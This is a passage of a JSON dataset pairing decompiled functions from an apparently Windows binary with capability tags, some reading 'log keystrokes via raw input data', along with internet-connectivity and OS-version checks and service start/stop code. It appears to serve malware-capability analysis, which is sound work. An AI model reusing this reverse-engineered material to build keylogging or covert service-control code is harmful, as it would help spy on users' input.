    "00410214": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410214(uint arg_8h, int32_t arg_ch, uint noname_2, uint *arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (arg_14h != NULL) {\n        *arg_14h = 0;\n    }\n    uStack20 = 0x410278;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.0040a01c();\n        fcn.00405dc8();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41027f;\n    uStack20 = 0x410277;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 217
    },
    "00412df0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412df0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x412ea2;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.00414f48();\n    uVar3 = var_4h;\n    iVar2 = (***0x4a4e58)(var_4h, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004056f4();\n        cVar1 = fcn.00409f80();\n        if (cVar1 == '\\0') {\n            fcn.0041107c();\n        }\n    }\n    else if (iVar2 == 0) {\n        var_8h = var_8h & 0xffffff | 1 - (var_8h == 0) << 0x18;\n    }\n    else {\n        fcn.0041107c();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040546c(0x412ea9);\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 362
    },
    "00412eb4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00412eb4(void)\n\n{\n    uchar *puStack24;\n    uchar auStack20 [16];\n    \n    puStack24 = auStack20;\n    sub.oleaut32.dll_VariantInit();\n    (***0x4a503c)(&puStack24);\n    fcn.0041107c();\n    return 1;\n}\n",
        "token_count": 78
    },
    "00412f58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00412f58(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    uint uStack28;\n    \n    uVar1 = fcn.00415f5c();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(uStack28 + 0x1c))(0xb);\n        *param_2 = '\\x01' - (uStack28 == 0);\n    }\n    return uVar1;\n}\n",
        "token_count": 141
    },
    "0041585c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041585c(uint param_1, char param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.004113a4();\n    }\n    *in_EAX = 0xb;\n    in_EAX[4] = -(param_2 != '\\0');\n    return;\n}\n",
        "token_count": 91
    },
    "004198f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004198f8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x41990a;\n    fcn.00419980();\n    uStack20 = 0x419974;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0x20) != '\\x01') {\n        puStack16 = &stack0xfffffffc;\n        iVar1 = fcn.0041966c();\n        if (iVar1 != -1) {\n            if (*(in_EAX + 0x20) == '\\x02') {\n                fcn.0041959c();\n            }\n            goto code_r0x0041995e;\n        }\n    }\n    fcn.004194b8();\ncode_r0x0041995e:\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41997b;\n    uStack20 = 0x419973;\n    fcn.004199e4();\n    return;\n}\n",
        "token_count": 285
    },
    "0041f9a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f9a0(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if ((param_1 == '\\x01') && (param_2 != 0)) {\n        fcn.0041f984();\n    }\n    if (*(in_EAX + 0x10) != 0) {\n        iVar2 = *(*(in_EAX + 0x10) + 8) + -1;\n        while (-1 < iVar2) {\n            piVar1 = fcn.00419610();\n            (**(*piVar1 + 0x10))();\n            iVar2 = iVar2 + -1;\n            if (*(*(in_EAX + 0x10) + 8) <= iVar2) {\n                iVar2 = *(*(in_EAX + 0x10) + 8) + -1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "00420b10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00420b10(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (in_EAX == 1) {\n        return 1;\n    }\n    if (in_EAX == 2) {\n        uVar1 = 2;\n    }\n    else if (in_EAX == 4) {\n        uVar1 = 3;\n    }\n    else if (in_EAX == 3) {\n        uVar1 = 4;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "004214dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.004214dc(void)\n\n{\n    int32_t arg_ch;\n    uchar *arg_8h;\n    uchar auStack20 [4];\n    \n    arg_8h = auStack20;\n    arg_ch = fcn.0042142c();\n    if (arg_ch < 1) {\n        fcn.0040546c();\n    }\n    else {\n        fcn.0040555c();\n        fcn.004058fc();\n        fcn.00421664(arg_8h, arg_ch);\n        if ((arg_8h == '\\x01') || (arg_8h == '\\x02')) {\n            fcn.004058fc();\n            fcn.0040a764();\n            fcn.00405b8c();\n        }\n        else {\n            fcn.00420aa0();\n        }\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "004220f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004220f8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_EDX;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY124;\n    int32_t iStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint lpServiceStatus;\n    uint var_28h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack64 = 0x422115;\n    var_8h = in_EDX;\n    fcn.004058ec();\n    uStack68 = 0x4221de;\n    iStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.0040546c();\n    var_28h = 0;\n    var_10h = 0;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA(0, 0, 0xf003f);\n    if (iVar1 != 0) {\n        if (var_ch == 0) {\n            uVar4 = 0x20;\n        }\n        else {\n            uVar4 = 0x10;\n        }\n        uVar2 = fcn.004058fc(uVar4 | 4);\n        iVar3 = sub.advapi32.dll_OpenServiceA(iVar1, uVar2);\n        if (iVar3 != 0) {\n            if (var_8h != 0) {\n                if (var_ch == 0) {\n                    sub.advapi32.dll_ControlService(iVar3, 1, &fcn.004220f8::lpServiceStatus);\n                }\n                else {\n                    sub.advapi32.dll_StartServiceA(iVar3, 0, &fcn.004220f8::var_10h);\n                }\n            }\n            sub.advapi32.dll_QueryServiceStatus(iVar3, &fcn.004220f8::lpServiceStatus);\n            sub.advapi32.dll_CloseServiceHandle(iVar3);\n        }\n        sub.advapi32.dll_CloseServiceHandle();\n        iStackY124 = iVar1;\n    }\n    fcn.00421fc0();\n    *in_FS_OFFSET = iStackY124;\n    fcn.0040546c(0x4221e5);\n    return;\n}\n",
        "token_count": 547
    },
    "00422adc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00422adc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404964();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.004229dc();\n    uVar1 = fcn.004058fc();\n    uVar1 = sub.kernel32.dll_CreateEventA(in_ECX, -(arg_14h != '\\0'), -(arg_10h != '\\0'), uVar1);\n    *(in_EAX + 4) = uVar1;\n    if (in_DL != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = in_ECX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 232
    },
    "004278b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004278b4(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iStack108;\n    int32_t iStack104;\n    char cStack100;\n    char cStack99;\n    char cStack98;\n    uchar uStack97;\n    uint8_t uStack93;\n    \n    piVar2 = 0x4a1ce4;\n    piVar3 = param_2;\n    for (iVar1 = 0xc; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *piVar3 = *piVar2;\n        piVar2 = piVar2 + 1;\n        piVar3 = piVar3 + 1;\n    }\n    if (in_EAX != 0) {\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            param_2[1] = in_EAX;\n            if (699 < iStack104) {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 1;\n            }\n            if (cStack100 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 2;\n            }\n            if (cStack99 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 4;\n            }\n            if (cStack98 == '\\x01') {\n                *(param_2 + 0xd) = *(param_2 + 0xd) | 8;\n            }\n            *(param_2 + 0xe) = uStack97;\n            fcn.004040f0();\n            fcn.0040399c();\n            if ((uStack93 & 0xf) == 1) {\n                *(param_2 + 3) = 2;\n            }\n            else if ((uStack93 & 0xf) == 2) {\n                *(param_2 + 3) = 1;\n            }\n            else {\n                *(param_2 + 3) = 0;\n            }\n            *param_2 = in_EAX;\n            param_2[2] = iStack108;\n        }\n    }\n    return;\n}\n",
        "token_count": 533
    },
    "00428404": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428404(void)\n\n{\n    fcn.0042836c();\n    fcn.00428388();\n    return;\n}\n",
        "token_count": 32
    },
    "00428520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428520(void)\n\n{\n    fcn.0042836c();\n    fcn.00428388();\n    return;\n}\n",
        "token_count": 32
    },
    "0042b8e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042b8e4(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack112;\n    int32_t iStack72;\n    \n    iVar1 = (***param_2)();\n    iVar2 = fcn.0041b48c();\n    if (100 < iVar1 - iVar2) {\n        (**(*param_2 + 0xc))();\n        (**(*param_2 + 0x14))();\n        if ((iStack112 == 1) && (iStack72 == 0x464d4520)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 158
    },
    "0042b944": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042b944(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        fcn.0042b3b8();\n    }\n    else if (1 < *(*(in_EAX + 0x28) + 4)) {\n        iVar2 = fcn.00404610();\n        iVar1 = *(*(in_EAX + 0x28) + 8);\n        if (iVar1 != 0) {\n            uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar1, 0);\n            *(iVar2 + 8) = uVar3;\n        }\n        *(iVar2 + 0x10) = *(*(in_EAX + 0x28) + 0x10);\n        *(iVar2 + 0xc) = *(*(in_EAX + 0x28) + 0xc);\n        *(iVar2 + 0x18) = *(*(in_EAX + 0x28) + 0x18);\n        *(iVar2 + 0x1c) = *(*(in_EAX + 0x28) + 0x1c);\n        *(iVar2 + 0x20) = *(*(in_EAX + 0x28) + 0x20);\n        fcn.0042c13c();\n        *(in_EAX + 0x28) = iVar2;\n        fcn.0042c138();\n    }\n    return;\n}\n",
        "token_count": 350
    },
    "0042d270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042d270(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 0x28) == 1) && (*(iVar1 + 0x2a) == 1)) {\n        return CONCAT31(iVar1 + 0x18 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 101
    },
    "0042ddc8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ddc8(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uint *puStack108;\n    uint lpvObject;\n    int32_t var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 8)) {\n        puStack108 = 0x42dde8;\n        fcn.0042d450();\n        puStack108 = 0x42ddf7;\n        fcn.00403ae4();\n        if (param_2 != 0) {\n            puStack108 = &fcn.0042ddc8::lpvObject;\n            uStack112 = 0x54;\n            puStack120 = 0x42de07;\n            iStack116 = param_2;\n            sub.gdi32.dll_GetObjectA();\n        }\n        if (*(iVar1 + 4) == 1) {\n            var_4h = *(iVar1 + 0x10);\n            *(iVar1 + 0x10) = 0;\n        }\n        else if (*(iVar1 + 0x10) == *0x4aaa1c) {\n            var_4h = *0x4aaa1c;\n        }\n        else {\n            puStack120 = 0x42de34;\n            var_4h = fcn.0042c970();\n        }\n        uStack124 = 0x42de63;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        uVar2 = 0;\n        puStack120 = &stack0xfffffffc;\n        fcn.0042d6c0(0, 0, &fcn.0042ddc8::lpvObject);\n        *in_FS_OFFSET = uVar2;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 474
    },
    "0042dfe4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042dfe4(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint auStack96 [4];\n    uint16_t uStack80;\n    uint16_t uStack78;\n    uint uStack72;\n    uint16_t uStack60;\n    uint16_t uStack58;\n    \n    iVar1 = in_EAX[10];\n    if ((*(iVar1 + 0x3c) == 1) && (*(iVar1 + 0x3e) == 1)) {\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    if (param_2 != uVar2) {\n        fcn.0042d460();\n        puVar4 = iVar1 + 0x18;\n        puVar5 = auStack96;\n        for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        uStack72 = 0;\n        uStack60 = param_2;\n        uStack80 = param_2;\n        uStack78 = uStack80;\n        uStack58 = uStack60;\n        fcn.0042cd80(auStack96);\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "0042e060": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042e060(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uint var_58h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[10];\n    if (param_2 != *(iVar1 + 0x10)) {\n        if ((param_2 == 0) && (*(iVar1 + 4) == 1)) {\n            fcn.00426d0c();\n            *(iVar1 + 0x10) = 0;\n        }\n        else {\n            fcn.0042d450();\n            fcn.0042d460();\n            puVar3 = iVar1 + 0x18;\n            puVar4 = &fcn.0042e060::var_58h;\n            for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            puStack116 = 0x42e0c6;\n            var_4h = fcn.0042c30c(0, &fcn.0042e060::var_58h);\n            uStack120 = 0x42e0f8;\n            uStack124 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff84;\n            uVar5 = 0;\n            puStack116 = &stack0xfffffffc;\n            fcn.0042d6c0(0, *(iVar1 + 0x70), &fcn.0042e060::var_58h);\n            *in_FS_OFFSET = uVar5;\n        }\n        fcn.0042c204();\n        *(in_EAX + 0x22) = 1;\n        (**(*in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 489
    },
    "0042ec80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.0042ec80(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack272 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack276 = 0x42ed83;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffee8;\n    uStack284 = 0x48;\n    uStack288 = *0x4aaa24;\n    uStack292 = 8;\n    puStack296 = 0x42ecab;\n    *0x4a1ce8 = sub.kernel32.dll_MulDiv();\n    *0x4a1ce8 = -*0x4a1ce8;\n    if (**0x4a5164 == 1) {\n        puStack296 = 0x42ecc1;\n        cVar1 = fcn.0042ec3c();\n        if (cVar1 == -0x80) {\n            puStack296 = 0x42ecd2;\n            fcn.00405504();\n        }\n    }\n    puStack296 = 0x42ecde;\n    var_8h = fcn.00420b38();\n    uStack300 = 0x42ed3b;\n    uStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    puStack296 = &stack0xfffffffc;\n    fcn.00420c14();\n    cVar1 = fcn.00420e7c();\n    if (cVar1 != '\\0') {\n        fcn.004214dc();\n        fcn.00420be4();\n    }\n    *in_FS_OFFSET = uStack304;\n    puStack296 = 0x42ed42;\n    uStack300 = 0x42ed3a;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 480
    },
    "0042f51c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042f51c(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *(in_EAX + 9) = 0;\n    *(in_EAX + 8) = 0;\n    *(in_EAX + 0x24) = 0;\n    *(in_EAX + 0x18) = 0;\n    *(in_EAX + 0x1c) = 0;\n    *(in_EAX + 0x20) = 0;\n    if (param_1 == 0) {\n        param_1 = 1;\n    }\n    *(in_EAX + 0x30) = param_1;\n    fcn.00406858(param_1);\n    fcn.0042f49c();\n    *(in_EAX + 0x38) = 0x696;\n    *(in_EAX + 0x40) = 0;\n    *(in_EAX + 0x44) = 0;\n    *(in_EAX + 10) = 0;\n    uVar1 = fcn.004207ec(fcn.0042f3e0, in_EAX);\n    *(in_EAX + 0x34) = uVar1;\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x1c4c) = uVar1;\n    uVar2 = 0;\n    uVar1 = fcn.00422adc(0, 0x42f5f8, 0, 0);\n    *(in_EAX + 0x1c50) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 492
    },
    "004304b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.004304b0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.wsock32.dll___WSAFDIsSet();\n    return iVar1 != 0;\n}\n",
        "token_count": 45
    },
    "00432388": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00432388(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    ushort uStack1036;\n    uint16_t uStack1034;\n    uchar auStack1032 [1024];\n    \n    uStack1036 = 0x300;\n    uStack1034 = *(in_EAX + 0x84);\n    if (*(in_EAX + 0x2c) == 1) {\n        uVar4 = uStack1034;\n        if (-1 < uVar4 - 1) {\n            iVar2 = 0;\n            puVar3 = auStack1032;\n            do {\n                uVar1 = *(**(in_EAX + 0x88) + iVar2);\n                *puVar3 = uVar1;\n                puVar3[1] = uVar1;\n                puVar3[2] = uVar1;\n                puVar3[3] = 0;\n                iVar2 = iVar2 + 1;\n                puVar3 = puVar3 + 4;\n                uVar4 = uVar4 - 1;\n            } while (uVar4 != 0);\n        }\n    }\n    else {\n        uVar4 = uStack1034;\n        if (-1 < uVar4 - 1) {\n            iVar2 = 0;\n            puVar3 = auStack1032;\n            do {\n                *puVar3 = *(*(*(in_EAX + 0x88) + 8) + iVar2);\n                puVar3[1] = *(*(*(in_EAX + 0x88) + 4) + iVar2);\n                puVar3[2] = *(**(in_EAX + 0x88) + iVar2);\n                puVar3[3] = 0;\n                iVar2 = iVar2 + 1;\n                puVar3 = puVar3 + 4;\n                uVar4 = uVar4 - 1;\n            } while (uVar4 != 0);\n        }\n    }\n    sub.gdi32.dll_CreatePalette(&uStack1036);\n    return;\n}\n",
        "token_count": 475
    },
    "00432a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432a80(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint uStack640;\n    uint uStack636;\n    uchar *puStack632;\n    uint var_25ch;\n    uint var_240h;\n    uint var_23ch;\n    int32_t var_234h;\n    uint var_8ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_EAX;\n    fcn.00432a2c();\n    fcn.00404640();\n    var_4h[0xb] = 0;\n    iVar2 = var_4h[10];\n    uVar1 = fcn.00404610();\n    *(iVar2 + 8) = uVar1;\n    puStack632 = 0x432ad2;\n    fcn.0041b510(param_2, param_2 >> 0x1f);\n    puStack632 = 0x432ae2;\n    fcn.0041b6b8();\n    if (0 < param_2) {\n        puVar4 = 0x4a2150;\n        puVar5 = &fcn.00432a80::var_8ch;\n        for (iVar3 = 0x21; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        puStack632 = 0x432b1d;\n        fcn.00432d8c();\n        uStack636 = 0x432ba2;\n        uStack640 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffd80;\n        uVar1 = 0;\n        puStack632 = &stack0xfffffffc;\n        fcn.0041b4ac(0, 0);\n        fcn.004344f8();\n        fcn.00433054();\n        *(iVar2 + 0x10) = var_240h;\n        *(iVar2 + 0xc) = var_23ch;\n        *(iVar2 + 0x14) = var_234h == 1;\n        iVar2 = fcn.004331a0();\n        *(var_4h + 0x41) = '\\x01' - (iVar2 == 0);\n        *in_FS_OFFSET = uVar1;\n        uStack640 = 0x432ba9;\n        fcn.00432e5c();\n        return;\n    }\n    *(var_4h + 0x22) = 1;\n    puStack632 = 0x432bbb;\n    (**(*var_4h + 0x10))();\n    return;\n}\n",
        "token_count": 665
    },
    "004330c0": {
